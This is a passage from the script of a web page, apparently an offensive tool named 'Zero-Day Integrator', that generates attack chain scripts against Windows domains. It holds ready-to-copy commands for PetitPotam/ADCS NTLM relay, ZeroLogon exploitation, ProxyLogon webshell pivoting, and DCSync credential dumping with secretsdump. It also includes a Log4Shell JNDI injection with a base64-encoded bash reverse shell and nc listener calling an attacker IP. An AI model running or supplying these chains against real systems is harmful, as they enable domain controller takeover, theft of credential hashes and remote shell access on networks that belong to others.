python3 gettgtpkinit.py domain.local/DC01$ -cert-pfx dc01.pfx dc01.ccache
export KRB5CCNAME=dc01.ccache

# 5. DCSync
secretsdump.py -k -no-pass domain.local/DC01$@$TARGET_DC`,
        petitpotam_esc8: `#!/bin/bash
# PetitPotam ESC8 Chain
TARGET_DC="dc01.domain.local"
ATTACKER_IP="192.168.1.100"

ntlmrelayx.py -t http://ca.domain.local/certsrv/certfnsh.asp --adcs --template DomainController &
sleep 3
python3 petitpotam.py $ATTACKER_IP $TARGET_DC
# Wait for certificate...
secretsdump.py -k -no-pass -dc-ip $TARGET_DC domain.local/DC01$@$TARGET_DC`,
        zerologon: `#!/bin/bash
# ZeroLogon Chain
TARGET_DC="dc01.domain.local"
DC_IP="192.168.1.10"

python3 zerologon_tester.py DC01 $DC_IP
python3 cve-2020-1472-exploit.py DC01 $DC_IP
secretsdump.py -no-pass -just-dc domain.local/DC01\\$@$DC_IP
python3 restorepassword.py domain.local/DC01@DC01 -target-ip $DC_IP`,
        proxylogon: `#!/bin/bash
# ProxyLogon Chain
TARGET="https://exchange.domain.local"
python3 proxylogon.py $TARGET
# Upload webshell and pivot to DC`,
        log4shell: `#!/bin/bash
# Log4Shell Chain
ATTACKER_IP="192.168.1.100"
java -jar rogue-jndi.jar --command "bash -c {echo,PAYLOAD}|{base64,-d}|{bash,-i}" --hostname $ATTACKER_IP &
nc -lvnp 9001 &
# Inject: \${jndi:ldap://$ATTACKER_IP:1389/Basic/ReverseShell}`
    };
    return codes[chainId] || '# Chain code not available';
}

function generateCVECode(cveId) {
    return `#!/usr/bin/env python3
# Exploit for ${cveId}
# Auto-generated by Zero-Day Integrator

import argparse

class Exploit:
    def __init__(self, target):
        self.target = target
    
    def check(self):
        print(f"[*] Checking {self.target} for ${cveId}...")
        return True
    
    def exploit(self):
        if not self.check():
            return None
        print("[*] Executing exploit...")
        return "shell_or_token"

if __name__ == '__main__':
    parser = argparse.ArgumentParser(description='${cveId} Exploit')
    parser.add_argument('target', help='Target host')
    args = parser.parse_args()
    
    exp = Exploit(args.target)
    result = exp.exploit()
    if result:
        print(f"[+] Success: {result}")`;
}

function integrateToRelayNinja() {
    if (!selectedCVE) { showToast('Select a CVE first', 'error'); return; }
    const config = `# Relay Ninja Config for ${selectedCVE.id}
coercion:
  method: "petitpotam"
  cve: "${selectedCVE.id}"
  target: "dc01.domain.local"
relay:
  target_type: "adcs"
  template: "DomainController"`;
    document.getElementById('codeOutputPanel').style.display = 'block';
    document.getElementById('generatedCode').textContent = config;
    showToast('Relay config generated', 'success');
}

function buildCustomChain() {
    const targetType = document.getElementById('customTargetType').value;
    const coercion = document.getElementById('customCoercion').value;
    const relay = document.getElementById('customRelayTarget').value;
    const code = `#!/bin/bash
# Custom Chain: ${targetType}
# Coercion: ${coercion} | Relay: ${relay}

ATTACKER_IP="192.168.1.100"
TARGET="target.domain.local"

# Start relay
ntlmrelayx.py -t ${relay === 'ldap' ? 'ldap://$TARGET --delegate-access' : relay === 'adcs' ? 'http://ca.domain.local/certsrv/certfnsh.asp --adcs' : 'http://$TARGET'}

# Trigger coercion
python3 ${coercion}.py $ATTACKER_IP $TARGET`;
    document.getElementById('codeOutputPanel').style.display = 'block';
    document.getElementById('generatedCode').textContent = code;
    switchTab('generated');
    showToast('Custom chain built', 'success');
}

function copyCode() {
    navigator.clipboard.writeText(document.getElementById('generatedCode').textContent);
    showToast('Code copied!', 'success');
}

function showToast(message, type = 'info') {
    const toast = document.getElementById('toast');
    document.getElementById('toastMessage').textContent = message;
    toast.className = `toast ${type} show`;
    setTimeout(() => toast.classList.remove('show'), 3000);
}
</script>
</body>
</html>
